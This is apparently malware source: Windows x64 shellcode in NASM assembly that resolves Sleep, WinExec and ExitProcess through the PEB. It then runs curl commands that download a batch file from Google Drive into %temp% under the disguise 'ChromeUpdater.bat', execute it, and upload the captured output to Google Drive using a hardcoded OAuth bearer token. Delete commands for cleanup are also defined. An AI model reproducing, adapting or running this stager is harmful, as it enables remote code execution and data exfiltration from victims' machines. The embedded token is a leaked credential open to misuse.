BITS 64

section .text
global _start

_start:

    sub rsp, 0x28
    and rsp, 0FFFFFFFFFFFFFFF0h 

    xor rax, rax
    xor rbx, rbx
    xor rcx, rcx
    mov rax, [gs:60h + rbx]
    mov rax, [rax+18h]            
    mov rax, [rax+20h]            
    mov rax, [rax+rcx]
    mov rax, [rax+rcx]
    mov rbx, [rax+20h]     
    mov r8, rbx            
    mov ebx, [rbx+3ch]
    add rbx, r8            
    mov rcx, 0x88FFFFFFFFFFFFFF
    shr rcx, 78h
    mov edx, [rbx + rcx]	
    add rdx, r8            
    mov r10d, [rdx + 14h]  
    xor r11, r11   
    mov r11d, [rdx + 20h]  
    add r11, r8
    xor rcx, rcx

    mov rcx, r10  
    findSleep:                
        jecxz foundSleep
        xor ebx, ebx
        mov ebx, [r11+4+rcx*4]
        add rbx, r8
        dec rcx
        mov rax, 78457065656C53FFh
        shr rax, 8h
        cmp [rbx], rax               
        jnz findSleep
    
    foundSleep:                   
        xor r11, r11
        mov r11d, [rdx+0x24]
        add r11, r8
        inc rcx
        mov r13w, [r11+rcx*2]
        xor r11, r11
        mov r11d, [rdx+0x1c]
        add r11, r8
        mov eax, [r11+4+r13*4]
        add rax, r8
        mov r12, rax

    xor rax, rax
    xor rbx, rbx
    xor rcx, rcx
    mov rax, [gs:60h + rbx]
    mov rax, [rax+18h]            
    mov rax, [rax+20h]            
    mov rax, [rax+rcx]
    mov rax, [rax+rcx]
    mov rbx, [rax+20h]     
    mov r8, rbx            
    mov ebx, [rbx+3ch]
    add rbx, r8            
    mov rcx, 0x88FFFFFFFFFFFFFF
    shr rcx, 78h
    mov edx, [rbx + rcx]	
    add rdx, r8            
    mov r10d, [rdx + 14h]  
    xor r11, r11   
    mov r11d, [rdx + 20h]  
    add r11, r8
    xor rcx, rcx

    mov rcx, r10                     
    findWinExec:                
        jecxz foundWinExec
        xor ebx, ebx
        mov ebx, [r11+4+rcx*4]
        add rbx, r8
        dec rcx
        mov rax, 636578456E6957FFh   
        shr rax, 8h                  
        cmp [rbx], rax               
        jnz findWinExec           
    
    foundWinExec:                   
        xor r11, r11
        mov r11d, [rdx+0x24]
        add r11, r8
        inc rcx
        mov r13w, [r11+rcx*2]
        xor r11, r11
        mov r11d, [rdx+0x1c]
        add r11, r8
        mov eax, [r11+4+r13*4]
        add rax, r8
        mov r14, rax

    xor rax, rax
    xor rbx, rbx
    xor rcx, rcx
    mov rax, [gs:60h + rbx]
    mov rax, [rax+18h]            
    mov rax, [rax+20h]            
    mov rax, [rax+rcx]
    mov rax, [rax+rcx]
    mov rbx, [rax+20h]     
    mov r8, rbx            
    mov ebx, [rbx+3ch]
    add rbx, r8            
    mov rcx, 0x88FFFFFFFFFFFFFF
    shr rcx, 78h
    mov edx, [rbx + rcx]	
    add rdx, r8            
    mov r10d, [rdx + 14h]  
    xor r11, r11   
    mov r11d, [rdx + 20h]  
    add r11, r8
    xor rcx, rcx

    mov rcx, r10                     
    mov rax, 737365FFFFFFFFFFh
    shr rax, 28h
    push rax
    mov rax, 636F725074697845h
    push rax
    mov rax, rsp
    mov rax, [rax]
    findExitProcess:                
        jecxz foundExitProcess
        xor ebx, ebx
        mov ebx, [r11+4+rcx*4]
        add rbx, r8
        dec rcx
        sub rsp, 0x10
        add rsp, 0x10
        cmp [rbx], rax
        jnz findExitProcess
    
    foundExitProcess:                   
        xor r11, r11
        mov r11d, [rdx+0x24]
        add r11, r8
        inc rcx
        mov r13w, [r11+rcx*2]
        xor r11, r11
        mov r11d, [rdx+0x1c]
        add r11, r8
        mov eax, [r11+4+r13*4]
        add rax, r8
        mov r9, rax

    xor rax, rax
    xor rbx, rbx
    xor rcx, rcx
    
    xor rdx, rdx
    mov cl, 1h
    mov rcx, cmd1
    sub rsp, 40h
    call r14
    add rsp, 40h

    mov cx, 2710h
    sub rsp, 40h
    call r12
    add rsp, 40h

    xor rdx, rdx
    mov cl, 1h
    mov rcx, cmd2
    sub rsp, 40h
    call r14
    add rsp, 40h

    mov cx, 2710h
    sub rsp, 40h
    call r12
    add rsp, 40h

    xor rdx, rdx
    mov cl, 1h
    mov rcx, cmd3
    sub rsp, 40h
    call r14
    add rsp, 40h

    xor rcx, rcx
    inc rcx
    sub rsp, 40h
    call r9

section .data
    cmd1: db "cmd /c curl -L ", 22h, "https://drive.google.com/uc?export=download&id=10SZeDUlI-IG4u1EXjP_VGUhdoQSAdYwS", 22h, " -o %temp%\ChromeUpdater.bat", 00h
    cmd2: db "cmd /c %temp%\ChromeUpdater.bat > %temp%\ChromeUpdater.bin", 00h
    cmd3: db "cmd /c curl -X POST -L -H ", 22h, "Authorization: Bearer ya29.a0AcM612zF139XYPBmGTJ0EroHPjdYnoNkppvbUc-AnkqsVGsiavAzqRNk2vLngCM1RmSgtYd9cwdLp87viYT8mwnyu91peagcOfa5CoQxm82iNcYl75A2sUcxqq-k1m-uoa5NA_GqGsqek6wWELEea5kJpI__0hf43z327z1CaCgYKATsSARISFQHGX2MiGp0J-yfcabTzwdUP2pLuGQ0175",22h, " -F ",22h,"metadata={name : 'output.txt'};type=application/json;charset=UTF-8", 22h, " -F ",22h, "file=@%temp%\ChromeUpdater.bin",22h, " ", 22h, "https://www.googleapis.com/upload/drive/v3/files?uploadType=multipart",22h, 00h
    cmd4: db "cmd /c del %temp%\ChromeUpdater.bin", 00h
    cmd5: db "cmd /c del %temp%\ChromeUpdater.bat"